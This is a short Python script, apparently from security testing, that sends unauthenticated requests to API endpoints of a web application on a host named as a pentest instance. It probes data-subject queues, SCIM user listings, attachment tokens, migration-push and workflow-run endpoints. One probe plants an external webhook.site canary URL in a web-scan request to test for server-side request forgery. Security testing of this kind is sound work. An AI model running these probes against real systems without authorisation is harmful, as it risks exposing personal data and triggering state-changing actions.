import urllib.request, urllib.error, time

BASE = "https://pentest-app.onetrust.com"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"}
CANARY = "https://webhook.site/e54a86c8-4b18-4d98-90a0-45a460cdcd00/unauth-webscan"

def probe(name, method, path, data=None, headers=None):
    h = dict(UA)
    if headers: h.update(headers)
    req = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    t = time.time()
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            body = r.read().decode("utf-8", "replace")[:300]
            print(f"PROBE {name} {r.status} {time.time()-t:.1f}s {body!r}")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")[:300]
        print(f"PROBE {name} {e.code} {time.time()-t:.1f}s {body!r}")
    except Exception as e:
        print(f"PROBE {name} ERROR {type(e).__name__} {e} after {time.time()-t:.1f}s")

print("START ot_unauth2")
probe("dsr_status_garbage_traceid", "GET", "/api/datasubject/v2/requestqueues/status/deadbeef1234")
probe("dsr_requestqueues_noauth", "GET", "/api/datasubject/v2/requestqueues")
probe("scim_v3_users_noauth", "GET", "/api/scim/v3/Users")
probe("webscans_noauth_canary", "POST", "/api/cmp/v1/webscans",
      data=('{"siteMapsUris":["' + CANARY + '"]}').encode(),
      headers={"Content-Type": "application/json"})
probe("attachment_token_garbage", "GET", "/api/document/v4/attachments/token/deadbeef1234")
probe("envsync_push_noauth", "POST", "/api/env-sync/v1/push-migrations",
      data=b"{}", headers={"Content-Type": "application/json"})
probe("workflow_run_noauth", "POST", "/api/v1/workflows/config/run",
      data=b"{}", headers={"Content-Type": "application/json"})
print("DONE ot_unauth2")
